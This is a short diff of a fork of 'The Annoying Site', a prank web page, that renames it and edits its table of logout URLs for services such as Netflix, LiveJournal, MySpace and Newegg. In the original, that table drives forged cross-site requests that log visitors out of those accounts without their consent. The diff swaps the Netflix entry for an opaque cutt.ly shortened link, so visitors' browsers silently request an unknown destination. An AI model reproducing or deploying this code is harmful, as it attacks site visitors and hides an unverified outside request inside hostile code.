@@ -1,8 +1,8 @@
 /* global Element */
 
 /**
- *  The Annoying Site
- *  https://theannoyingsite.com
+ *  The Destroyer BaapG
+ *  https://instagram.com/krish_na_2568
  *
  *  Author:
  *    Baapg Ghazipur Up
@@ -123,7 +123,7 @@ const LOGOUT_SITES = {
   Linode: ['GET', 'https://manager.linode.com/session/logout'],
   LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
   MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
-  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
+  NetFlix: ['GET', 'https://cutt.ly/yQYypD4'],
   'New York Times': ['GET', 'https://www.nytimes.com/logout'],
   Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
   Photobucket: ['GET', 'https://photobucket.com/logout'],
